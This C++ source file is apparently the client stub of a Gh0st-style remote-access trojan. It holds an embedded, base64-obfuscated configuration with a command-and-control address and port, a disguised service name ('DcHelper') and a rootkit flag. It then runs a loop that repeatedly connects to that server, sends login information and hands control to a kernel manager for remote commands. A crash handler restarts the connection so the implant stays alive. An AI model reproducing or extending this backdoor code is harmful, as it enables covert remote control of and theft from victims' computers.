#include "stdafx.h"

#include "..\\common\\ClientSocket.h"
#include "MyKernelManager.h"
#include "login.h"
#include "..\\common\\until.h"

#define DE
#include "debug.h"

#pragma comment(lib,"msvcrt.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98 /nodefaultlib:libcmt.lib")

HMODULE htempModule;
unsigned short svcname[64];

struct DLL_INFO
{
	char TestString1[17];
	char LoginFtp[255];
	char LoginAddr[150];
	char LoginPort[30];
	char ServiceName[50];
	char ServiceDisplayName[50];
	char ServiceDescription[150];
	char Dllname[50];
	char Beizhu[50];//备注
	bool isRootkit;
	bool isFtpEnable;
}dll_info = 
{
	"127.0.0.1",
	"wbW1uXN+fra2tn/LyMDFtH/Kvrx+y8jKwn+7vLfLaQ==",
	"MTI3LjAuMC4x", //127.0.0.1
    "ODA4",//808
	"e3t7e3tp",//22222
	"pcqhxL25xLtp",//DcHelper
	"8A0pPBsY7/ztGhUR9CWlnqqc9i8fOGk=",
	"wsS7v8S9e3p/xb29aQ==",
	"e3t7e3tp", //222
	false,
	false,
};

enum lx_status
{
	NOT_CONNECT, //  还没有连接
		GETLOGINFO_ERROR,
		CONNECT_ERROR,
		HEARTBEATTIMEOUT_ERROR
};

DWORD WINAPI ConnectThead(LPVOID lp)
{
	int iRet;
	HANDLE hMyHandle = NULL;

	sockaddr_in name = {0}; 
	name.sin_family = AF_INET; 
	int namelen = sizeof(sockaddr_in); 
	SOCKET s = (SOCKET)hMyHandle; 
	iRet = getsockname( s,(sockaddr*)&name,&namelen); 

	if ( iRet != SOCKET_ERROR ) 
	{ 
		int sockType = 0; 
		int optlen = 4; 
		iRet = getsockopt(s,SOL_SOCKET,SO_TYPE,(char*)&sockType,&optlen ); 
	}
	
	HWINSTA hWinSta = OpenWindowStationW(L"winsta0", FALSE, MAXIMUM_ALLOWED);

	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);

	SetErrorMode( SEM_FAILCRITICALERRORS);
	TCHAR	*lpszHost = NULL;
	DWORD	dwPort = 80;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	
	while (1)
	{
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			 Sleep(2000);
		}


#ifdef UNICODE
			TCHAR   tempW_lpszHost[255],tempW_dwPort[255];

			MultiByteToWideChar( CP_ACP, 0, MyDecode(dll_info.LoginAddr), -1, tempW_lpszHost, sizeof(tempW_lpszHost) / sizeof(tempW_lpszHost[0]));

			MultiByteToWideChar( CP_ACP, 0, MyDecode(dll_info.LoginPort), -1, tempW_dwPort, sizeof(tempW_dwPort) / sizeof(tempW_dwPort[0]));
			
			lpszHost = tempW_lpszHost;
			dwPort = mywtoi(tempW_dwPort);
#else
			lpszHost = MyDecode(dll_info.LoginAddr);
			dwPort = _ttoi(MyDecode(dll_info.LoginPort));
#endif


		DWORD dwTickCount = GetTickCount();
 		if (!socketClient.Connect(lpszHost, dwPort))
		{
			OutputDebugString(_T("!socketClient.Connect(lpszHost, dwPort)"));
			bBreakError = CONNECT_ERROR;
			continue;
		}

		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(svcname, &socketClient, GetTickCount() - dwTickCount);
		CMyKernelManager	manager(&socketClient, svcname, 1, NULL, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(10000);
		}
		
		if (!manager.IsActived())
		{
			OutputDebugString(_T("!manager.IsActived()"));
			continue;
		}

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(dwIOCPEvent != WAIT_OBJECT_0);
	}

	SetErrorMode(0);
		
	return 0;
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	OutputDebugString(_T("crashed ....fuck   \n"));
	
	ConnectThead(0);

	return 0;
}

DWORD WINAPI RoutineMain(LPVOID lp)
{
	SetUnhandledExceptionFilter(bad_exception);

    ConnectThead(NULL);

    return 0;
}

#ifdef EXEBUILD
#pragma comment(lib,"advapi32.lib")
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	RoutineMain(NULL);
	
	return 0;
}
#endif
